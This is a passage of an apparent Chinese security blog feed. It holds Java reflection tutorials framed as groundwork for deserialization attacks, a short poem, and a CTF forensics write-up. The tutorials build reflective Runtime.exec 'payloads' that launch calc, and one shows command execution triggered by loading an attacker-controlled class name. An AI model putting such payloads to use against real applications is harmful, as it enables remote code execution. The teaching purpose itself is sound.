class="string">&quot;calc&quot;</span>&#125;&#125;);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;start&quot;</span>).invoke(instance);</span><br></pre></td></tr></table></figure></p><p>继续说上面提到的第二个问题，如果一个方法或构造方法是私有方法，我们是否能执行它呢？<br>这就涉及到 getDeclared 系列的反射了，与普通的 getMethod 、getConstructor 的区别是：</p><ul><li>getMethod 系列方法获取的是当前类中所有公共方法，包括父类继承的方法。</li><li>getDeclaredMethod 系列方法获取的就是当前类中的 ”声明“ 的方法，是实写在这个类里的，包括私有的方法，但从父类里继承来的就不包含了。</li></ul><p>举个例子，我们之前说过 Runtime 这个类的构造函数是私有的，我们需要用 Runtime.getRuntime() 来获取对象。其实现在我们也可以直接用  getDeclaredConstructor 来获取这个私有的构造方法来实例 化对象，进而执行命令.<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; constructor = clazz.getDeclaredConstructor();</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(constructor.newInstance(),<span class="string">&quot;calc&quot;</span>);</span><br></pre></td></tr></table></figure><br> 可见，这里使用了一个方法 setAccessible ，这个是必须的。我们在获取到一个私有方法后，必须用 setAccessible 修改它的作用域，否则仍然不能调用。  </p>]]></content>
    
    
    <summary type="html">Java反射学习之路~</summary>
    
    
    
    
    <category term="Java基础知识" scheme="https://nack0c.github.io/tags/Java%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>反射篇-2</title>
    <link href="https://nack0c.github.io/posts/50ee2d00/"/>
    <id>https://nack0c.github.io/posts/50ee2d00/</id>
    <published>2023-05-17T11:10:17.000Z</published>
    <updated>2023-05-22T05:57:12.830Z</updated>
    
    <content type="html"><![CDATA[<div class="note orange icon-padding simple"><i class="note-icon fas fa-battery-half"></i><p>我们接着上一节，上次谈到了 forName.<br>  在正常情况下，除了系统类，如果我们想拿到一个类，需要先 import 才能使用。而使用forName就不需要，这样对于我们的攻击者来说就十分有利，我们可以加载任意类。<br>  获得类以后，我们可以继续使用反射来获取这个类中的属性、方法，也可以实例化这个类，并调用方法。  </p></div><div class="note red icon-padding simple"><i class="note-icon fas fa-bullhorn"></i><p> class.newInstance() 的作用就是调用这个类的无参构造函数，这个比较好理解。不过，我们有时候 在写漏洞利用方法的时候，会发现使用 newInstance 总是不成功，这时候原因可能是：  </p><ul><li>你使用的类没有无参构造函数  </li><li>你使用的类构造函数是私有的  </li></ul><p>最最常见的就是 java.lang.Runtime  这个类在我们构造命令执行Payload的时候很常见，但我们不能直接这样来执行命令:</p></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">calc</span> <span class="operator">=</span> method.invoke(clazz.newInstance(), <span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.328888.xyz/2023/05/17/VVkioX.png" alt="image.png"><br><strong>原因就是 Runtime 是私有的！！！</strong></p><blockquote><p>  有同学就比较好奇，为什么会有类的构造方法是私有的，难道他不想让用户使用这个类吗？这其实涉及 到很常见的设计模式：“单例模式”。（有时候工厂模式也会写成类似） 比如，对于Web应用来说，数据库连接只需要建立一次，而不是每次用到数据库的时候再新建立一个连 接，此时作为开发者你就可以将数据库连接使用的类的构造函数设置为私有，然后编写一个静态方法来 获取。</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TrainDB</span> &#123;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="type">TrainDB</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TrainDB</span>();</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> TrainDB <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> instance;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">private</span> <span class="title function_">TrainDB</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="comment">// 建立连接的代码...</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>  这样，只有类初始化的时候会执行一次构造函数，后面只能通过 getInstance 获取这个对象，避免建 立多个数据库连接。<br>  回到正题，Runtime类就是单例模式，我们只能通过 Runtime.getRuntime() 来获取到 Runtime 对象。我们将上述Payload进行修改即可正常执行命令了</p></blockquote><p><img src="https://i.328888.xyz/2023/05/17/VVkyjJ.png" alt="image.png"><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(clazz),<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>这里用到了 getMethod 和 invoke 方法。</p><h4 id="getMethod"><a href="#getMethod" class="headerlink" title="getMethod"></a>getMethod</h4><p class="div-border top red">getMethod 的作用是通关反射获取一个类的某个特定的公有方法（public）。而学过Java的同学应该清楚，Java中 支持类的重载，我们不能仅通过函数名来确定一个函数。所以，在调用 getMethod 的时候，我们需要传给他你需要获取的函数的参数类型列表。  </p><p>比如：Runtime.getRuntime 有6个 exec 方法的重载，它们传入的参数个数、类型也是不同的。<br><img src="https://i.328888.xyz/2023/05/17/VVkAYA.png" alt="image.png"></p><h4 id="invoke"><a href="#invoke" class="headerlink" title="invoke"></a>invoke</h4><div class="note warning simple"><p>invoke 的作用是执行方法，它的第一个参数是：</p><ul><li>如果这个方法是一个普通方法，那么第一个参数是类对象；</li><li><p>如果这个方法是一个静态方法，那么第一个参数是类；</p><p>这也比较好理解了，我们正常执行方法是 [1].method([2], [3], [4]…) ，其实在反射里就是 method.invoke([1], [2], [3], [4]…) 。  </p></li></ul></div><p> 所以我们将上述命令执行的Payload分解一下就是：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, InstantiationException &#123;</span><br><span class="line">        Class&lt;?&gt; clazz = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method1</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;getRuntime&quot;</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">invoke</span> <span class="operator">=</span> method1.invoke(clazz);</span><br><span class="line">        <span class="type">Method</span> <span class="variable">method2</span> <span class="operator">=</span> clazz.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        method2.invoke(invoke,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        </span><br><span class="line"><span class="comment">//        Method method = clazz.getMethod(&quot;exec&quot;, String.class);</span></span><br><span class="line"><span class="comment">//        method.invoke(clazz.getMethod(&quot;getRuntime&quot;).invoke(clazz),&quot;calc&quot;);</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    
    <summary type="html">Java反射学习之路~</summary>
    
    
    
    
    <category term="Java基础知识" scheme="https://nack0c.github.io/tags/Java%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>反射篇-1</title>
    <link href="https://nack0c.github.io/posts/c9e77cba/"/>
    <id>https://nack0c.github.io/posts/c9e77cba/</id>
    <published>2023-05-17T10:22:18.000Z</published>
    <updated>2023-05-22T05:57:12.830Z</updated>
    
    <content type="html"><![CDATA[<div class="note red icon-padding simple"><i class="note-icon fas fa-bullhorn"></i><p>Java安全可以从反序列化漏洞开始说起，反序列化漏洞⼜可以从反射开始说起。 反射是⼤多数语⾔⾥都必不可少的组成部分，对象可以通过反射获取他的类，类可以通过反射拿到所有 ⽅法（包括私有），拿到的⽅法可以调⽤，总之通过“反射”，我们可以将Java这种静态语⾔附加上动态特性。 </p></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">execute</span><span class="params">(String className, String methodName)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">Class</span> <span class="variable">clazz</span> <span class="operator">=</span> Class.forName(className);</span><br><span class="line">    classzz.getMethod(methodName).invoke(class.newInstance());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的例子中，演示了几个反射中很重要的方法：</p><blockquote><ul><li>获取类的方法：forName</li><li>实例化类对象的方法：newInstance</li><li>获取函数的方法：getMethod</li><li>执行函数的方法：invoke</li></ul></blockquote><p>forName 不是获取“类”的唯一途径，通常来说我们有如下三种方式获取一个“类”，也就是 java.lang.Class 对象：<br><div class="note red icon-padding simple"><i class="note-icon fas fa-bullhorn"></i><ul><li>obj.getClass()    <ul><li>如果上下⽂中存在某个类的实例 obj ，那么我们可以直接通过  obj.getClass()    来获取它的类。</li></ul></li><li>Test.class<ul><li>如果你已经加载了某个类，只是想获取到它的 java.lang.Class 对象，那么就直接拿它的 class 属性即可。这个⽅法其实不属于反射。  </li></ul></li><li>Class.forName()<ul><li>如果你知道某个类的名字，想获取到这个类，就可以使⽤ forName 来获取  。</li></ul></li></ul></div><br>关于 forName<br>forName 有两个函数重载</p><ul><li>Class&lt;?&gt; forName(String name)</li><li>Class&lt;?&gt; forName(String name, <strong>boolean</strong> initialize, ClassLoader loader )<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Class.forName(className)</span><br><span class="line">// 等于</span><br><span class="line">Class.forName(className,true,currentLoader)</span><br></pre></td></tr></table></figure>默认情况下， forName 的第一个参数是类名；第二个参数标识是否初始化；第三个参数就是 ClassLoader.<div class="note info simple"><p>ClassLoader<br>  “加载器”，告诉Java虚拟机如何加载这个类。</p></div></li></ul><p>关于 initialize = true.<br><div class="note red icon-padding simple"><i class="note-icon fas fa-bullhorn"></i><p>可以理解为类的初始化。下面举一个例子。</p></div><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Empty block initial %s\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Static initial %s\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Main</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Initial %s\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>我们举这个例子的目的在于查看 代码块{}、构造函数、static{} 三者的执行顺序。<br><img src="https://i.328888.xyz/2023/05/17/VVZ7xw.png" alt="image-1.png"><br>那么，假设我们有下面这段函数，其中参数 <strong>name </strong>可控。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TouchFile</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        String[] commands = &#123;<span class="string">&quot;calc&quot;</span>&#125;;</span><br><span class="line"><span class="comment">//        String[] commands = &#123;&quot;touch&quot;,&quot;/tmp/success&quot;&#125;;</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(commands);</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">ref</span><span class="params">(String name)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        Class.forName(name);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><img src="https://i.328888.xyz/2023/05/17/VVZLcF.png" alt="image-2.png"> </p>]]></content>
    
    
    <summary type="html">Java反射学习之路~</summary>
    
    
    
    
    <category term="Java基础知识" scheme="https://nack0c.github.io/tags/Java%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"/>
    
  </entry>
  
  <entry>
    <title>阳光不燥，微风正好</title>
    <link href="https://nack0c.github.io/posts/b8cf1317/"/>
    <id>https://nack0c.github.io/posts/b8cf1317/</id>
    <published>2023-05-15T17:22:18.000Z</published>
    <updated>2023-05-22T05:57:12.830Z</updated>
    
    <content type="html"><![CDATA[<h1 id="夏至"><a href="#夏至" class="headerlink" title="夏至"></a>夏至</h1><blockquote><p>一生的时间很短<br> 短到不过是两颗心之间的距离</p></blockquote><div class="tip "><p>default</p></div>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;夏至&quot;&gt;&lt;a href=&quot;#夏至&quot; class=&quot;headerlink&quot; title=&quot;夏至&quot;&gt;&lt;/a&gt;夏至&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;一生的时间很短&lt;br&gt; 短到不过是两颗心之间的距离&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class=&quot;t</summary>
      
    
    
    
    
    <category term="生活" scheme="https://nack0c.github.io/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>2022-第二届网刃杯</title>
    <link href="https://nack0c.github.io/posts/55b1a5b2/"/>
    <id>https://nack0c.github.io/posts/55b1a5b2/</id>
    <published>2023-05-13T17:27:00.000Z</published>
    <updated>2023-05-22T05:57:12.830Z</updated>
    
    <content type="html"><![CDATA[<p><a name="kTMJT"></a></p><h2 id="ICS"><a href="#ICS" class="headerlink" title="ICS"></a>ICS</h2><p><a name="DSfng"></a></p><h3 id="1-ncsubj"><a href="#1-ncsubj" class="headerlink" title="1.ncsubj"></a>1.ncsubj</h3><p>wireshark 打开，追踪 S7COMM 流，发现奇怪的字符，截取出来<br /><img src="/images/CTF/2022-第二届网刃杯/image-2.png" alt="image.png"><br />base64 decode-&gt;&gt;<br /><img src="/images/CTF/2022-第二届网刃杯/image-3.png" alt="image.png"><br />rot13 decode-&gt;&gt;<br /><img src="/images/CTF/2022-第二届网刃杯/image-4.png" alt="image.png"><br />flag{whatancsubject}<br><a name="TMDyv"></a></p><h3 id="2-LED-BOOM"><a href="#2-LED-BOOM" class="headerlink" title="2.LED_BOOM"></a>2.LED_BOOM</h3><p><img src="/images/CTF/2022-第二届网刃杯/image-5.png" alt="image.png"><br /><img src="/images/CTF/2022-第二届网刃杯/image-6.png" alt="image.png"><br />LED 闪了三次，管理员大大也提示了，查看数据包<br /><img src="/images/CTF/2022-第二届网刃杯/image-7.png" alt="image.png"><br /><strong>密文是：U2FsdGVkX19cOOV8qLVgcso8U4fse+7LirQKiHFkn9HU9BuwFAivH1siJXg/Rk6z</strong><br />为 aes/des 加密<br /><strong>密钥是：585692787</strong><br />解码即可<br /><img src="/images/CTF/2022-第二届网刃杯/image-8.png" alt="image.png"><br><a name="osWHY"></a></p><h3 id="3-需要安全感"><a href="#3-需要安全感" class="headerlink" title="3.需要安全感"></a>3.需要安全感</h3><p><a name="CF3RI"></a></p><h3 id="4-carefulguy"><a href="#4-carefulguy" class="headerlink" title="4.carefulguy"></a>4.carefulguy</h3><p>还是流量分析，wireshark打开，这个脑洞确实，还是自己太菜了。。。查找flag 然后没有什么信息，之后追踪 TCP 流。。<br /><img src="/images/CTF/2022-第二届网刃杯/image-9.png" alt="image.png"><br />只好往上看看，是否有信息<br /><img src="/images/CTF/2022-第二届网刃杯/image-10.png" alt="image.png"><br />直到第3个才发现有16进制信息，而且有规律，都拿出来看看<br /><img src="/images/CTF/2022-第二届网刃杯/image-11.png" alt="image.png"><br />到第 22 个以为结束了，发现还有…我丢！！！累死了。继续<br /><img src="/images/CTF/2022-第二届网刃杯/image-12.png" alt="image.png"><br />呵呵….我谢谢他哈~<br /><img src="/images/CTF/2022-第二届网刃杯/image-13.png" alt="image.png"><br /><img src="/images/CTF/2022-第二届网刃杯/image-14.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">666c61677b7034757333313576337279316e7433726573746963397d</span><br></pre></td></tr></table></figure><p><a name="t7moP"></a></p><h3 id="5-喜欢移动的黑客"><a href="#5-喜欢移动的黑客" class="headerlink" title="5.喜欢移动的黑客"></a>5.喜欢移动的黑客</h3><p>这里补一张常见 16进制 文件头 和 文件尾<br /><img src="/images/CTF/2022-第二届网刃杯/image-15.png" alt="image.png"><br /><img src="/images/CTF/2022-第二届网刃杯/image-16.png" alt="image.png"><br /><strong>这是文件 hint </strong><br /><img src="/images/CTF/2022-第二届网刃杯/image-17.png" alt="image.png"><br />打不开啊~~~，file 看看是不是 pcapng 文件<br /><img src="/images/CTF/2022-第二届网刃杯/image-18.png" alt="image.png"><br />010editor 打开看看是不是缺少文件头<br /><img src="/images/CTF/2022-第二届网刃杯/image-19.png" alt="image.png"><br /><img src="/images/CTF/2022-第二届网刃杯/image-20.png" alt="image.png"><br />emm，开补  <strong>0A 0D 0D 0A </strong><br /><img src="/images/CTF/2022-第二届网刃杯/image-21.png" alt="image.png"><br />首先 筛选 <strong>modbus</strong> 因为是工控协议嘛，查看数据大于1000<br /><img src="/images/CTF/2022-第二届网刃杯/image-22.png" alt="image.png"><br /><img src="/images/CTF/2022-第二届网刃杯/image-23.png" alt="image.png"><br />后来发现还有一个数据包也可以  <strong>270f </strong>的10进制为 9999<br /><img src="/images/CTF/2022-第二届网刃杯/image-24.png" alt="image.png"></p><ol><li>flag{<strong>2766</strong>68156} 这里 2766 需要转换 hex —&gt;flag{<strong>10086</strong>68156}<br><a name="Tugb6"></a></li></ol><h3 id="6-easyiec"><a href="#6-easyiec" class="headerlink" title="6.easyiec"></a>6.easyiec</h3><p>名副其实的签到题，wireshark 追踪 tcp 流 find 一下<br /><img src="/images/CTF/2022-第二届网刃杯/image-25.png" alt="image.png"><br><a name="mVChA"></a></p><h3 id="7-cryptolalia"><a href="#7-cryptolalia" class="headerlink" title="7.cryptolalia"></a>7.cryptolalia</h3><p>解压完毕发现只有一张图片，还这么大… 还有一条 🐟（此🐟很重要！！！）<br /><img src="/images/CTF/2022-第二届网刃杯/image-26.png" alt="image.png"><br /><img src="/images/CTF/2022-第二届网刃杯/image-27.png" alt="image.png"><br />binwalk 分离一下，发现 zip <br /><img src="/images/CTF/2022-第二届网刃杯/image-28.png" alt="image.png"><br />提取出来瞅瞅…   头一次参加工控类的 CTF 感觉也很不错啊，都是贴近工厂，哈哈哈<br /><img src="/images/CTF/2022-第二届网刃杯/image-29.png" alt="image.png"><br />给的提示很明显了，先 <strong>污泥脱水间数据详情 </strong>后 <strong>设备药剂间数据详情</strong><br /><img src="/images/CTF/2022-第二届网刃杯/image-30.png" alt="image.png"><br />fuzz 爆破一下四位数，他就来了~<br /><img src="/images/CTF/2022-第二届网刃杯/image-31.png" alt="image.png"><br />解压之后还是 wireshark <br />发现 des 密文<br /><img src="/images/CTF/2022-第二届网刃杯/image-32.png" alt="image.png"><br /><strong>U2FsdGVkX19  </strong>我发现绝大部分 des 加密都是以这个开头的 ~~~<br />接下来继续根据提示 🐟 解密，使用的是 <strong>TripleDes</strong>  <a href="https://www.sojson.com/encrypt_triple_des.html">https://www.sojson.com/encrypt_triple_des.html</a><br /><img src="/images/CTF/2022-第二届网刃杯/image-33.png" alt="image.png"><br />发现开始打不开，但是还没有解压密码，根据提示 <strong>眼见不一定为实</strong> 010editor 发现<strong>伪加密</strong><br><a name="lUp6b"></a></p><h4 id="伪加密"><a href="#伪加密" class="headerlink" title="伪加密"></a>伪加密</h4><p>主要是查看压缩包的文件头标志位</p><ol><li>压缩文件数据区（全局加密）</li></ol><p>504B0304      这个是压缩包的文件头  它的后3、4个字节（byte）</p><ol><li>压缩文件目录区（全局加密）</li></ol><p>504B0102      这个是压缩包文件目录区  它的后5、6个字节（byte）</p><pre><code>  1. 无加密</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">● 压缩文件数据区 ：00 00 </span><br><span class="line">● 压缩文件目录区 ：00 00 </span><br></pre></td></tr></table></figure><pre><code>  2. 假加密</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">● 压缩文件数据区 ：00 00 </span><br><span class="line">● 压缩文件目录区 ：09 00 </span><br></pre></td></tr></table></figure><pre><code>  3. 真加密</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">● 压缩文件数据区 ：09 00 </span><br><span class="line">● 压缩文件目录区 ：09 00 </span><br></pre></td></tr></table></figure><p>之后我们再看这个题目，<strong>压缩文件数据区为 00 00 但是压缩文件目录区为 09 00 </strong>所以为 <strong>伪加密</strong><br /><img src="/images/CTF/2022-第二届网刃杯/image-34.png" alt="image.png"><br /><img src="/images/CTF/2022-第二届网刃杯/image-35.png" alt="image.png"><br />此时我们修改 <strong>压缩文件目录区标志位</strong> 为 <strong>00 00 </strong>即可<br />wireshark 打开，发现 <strong>IHDR </strong>隐藏图片，复制 Data，粘贴出来（这里一定到看常用的文件尾部的16进制，否则会有数据缺失。。。）<br /><img src="/images/CTF/2022-第二届网刃杯/image-36.png" alt="image.png"><br /><img src="/images/CTF/2022-第二届网刃杯/image-37.png" alt="image.png"><br />这里再来一张，因为涉及到 jpg 格式的文件尾部。。。差点害惨我，呜呜~~~<br /><img src="/images/CTF/2022-第二届网刃杯/image-38.png" alt="image.png"><br />010 editor 粘贴进去，下面给出详细步骤，因为很坑….<br /><img src="/images/CTF/2022-第二届网刃杯/image-39.png" alt="image.png"><br />保存 flag.png 调整宽高<br /><img src="/images/CTF/2022-第二届网刃杯/image-40.png" alt="image.png"><br /><img src="/images/CTF/2022-第二届网刃杯/image-41.png" alt="image.png"><br /><img src="/images/CTF/2022-第二届网刃杯/image-42.png" alt="image.png"><br /><strong>这里还有另外一种从 wireshark 中导出数据的方式，就是利用 tshark</strong><br /><img src="/images/CTF/2022-第二届网刃杯/image-43.png" alt="image.png"><br><a name="WGge8"></a></p><h3 id="8-xyp07"><a href="#8-xyp07" class="headerlink" title="8.xyp07"></a>8.xyp07</h3><p>打开发现压缩包加密了。。。010 editor 打开<br /><img src="/images/CTF/2022-第二届网刃杯/image-44.png" alt="image.png"><br />发现文件最后有密文，base64…<br /><img src="/images/CTF/2022-第二届网刃杯/image-45.png" alt="image.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Vm0weGQxRXlTWGxVV0d4V1YwZFNVRlpyV25kWlZsSllZMFZrVmxKdVFsaFdNalZMWWtkS1IxTnFSbGhYU0VKNlZsWmFWMVpWTVVWaGVqQTk=</span><br></pre></td></tr></table></figure><p>base 64 decode，也就解了 7~8 次吧。。。<br /><img src="/images/CTF/2022-第二届网刃杯/image-46.png" alt="image.png"><br />wireshark 分析了半天，TCP追踪流也看了眼睛也花了，之后过滤掉。。。<br /><img src="/images/CTF/2022-第二届网刃杯/image-47.png" alt="image.png"><br />开始追踪 协议为 S7COMM 的TCP流，发现异常的数据信息，base91..<br /><img src="/images/CTF/2022-第二届网刃杯/image-48.png" alt="image.png"><br /><img src="/images/CTF/2022-第二届网刃杯/image-49.png" alt="image.png"><br><a name="rBMa3"></a></p><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><p><a name="KQoUb"></a></p><h3 id="1-FindMe"><a href="#1-FindMe" class="headerlink" title="1.FindMe"></a>1.FindMe</h3><p>给了提示，让去 GitHub 搜一下…<br /><img src="/images/CTF/2022-第二届网刃杯/image-50.png" alt="image.png"><br />下载下来，结果火绒报毒了…<br /><img src="/images/CTF/2022-第二届网刃杯/image-51.png" alt="image.png"><br />看到网上大佬说放入 VT 扫一下<br /><img src="/images/CTF/2022-第二届网刃杯/image-52.png" alt="image.png"><br /><img src="/images/CTF/2022-第二届网刃杯/image-53.png" alt="image.png"><br><a name="iOABR"></a></p><h3 id="2-不要相信你看到的"><a href="#2-不要相信你看到的" class="headerlink" title="2.不要相信你看到的"></a>2.不要相信你看到的</h3><p><a name="DY2Wy"></a></p><h3 id="3-所见非所见"><a href="#3-所见非所见" class="headerlink" title="3.所见非所见"></a>3.所见非所见</h3><p><a name="XAgIp"></a></p><h3 id="4-玩坏的winxp"><a href="#4-玩坏的winxp" class="headerlink" title="4.玩坏的winxp"></a>4.玩坏的winxp</h3><p>文件解压，是 vmdk 虚拟磁盘，挂载到 <strong>DiskGenius</strong> <br /><img src="/images/CTF/2022-第二届网刃杯/image-54.png" alt="image.png"><br />查看桌面 存了10个T的学习资料，厉害~结果是 meiren 照片！<br />统统导出来！！！<br /><img src="/images/CTF/2022-第二届网刃杯/image-55.png" alt="image.png"><br />发现最后一个有点问题啊，为什么这么大…..<br />分离看看，藏了个 压缩包…<br /><img src="/images/CTF/2022-第二届网刃杯/image-56.png" alt="image.png"><br />emm 挺好的<del>~<br /><img src="/images/CTF/2022-第二届网刃杯/image-57.png" alt="image.png"><br />010 editor 打开发现还藏着  zip !!! 继续 binwalk<br /><img src="/images/CTF/2022-第二届网刃杯/image-58.png" alt="image.png"><br />结果有秘密。。。看到了压缩包注释信息，看到了 <strong>围脖 </strong>，想到了 <strong>Firefox </strong><br /><img src="/images/CTF/2022-第二届网刃杯/image-59.png" alt="image.png"><br />发现很多 sqlite 文件，打开看看<br /><img src="/images/CTF/2022-第二届网刃杯/image-60.png" alt="image.png"><br />发现了 Firefox 浏览器记录信息包含一个QQ号<br /><img src="/images/CTF/2022-第二届网刃杯/image-61.png" alt="image.png"><br />加不上好友，那就看看空间吧</del><br /><img src="/images/CTF/2022-第二届网刃杯/image-62.png" alt="image.png"><br 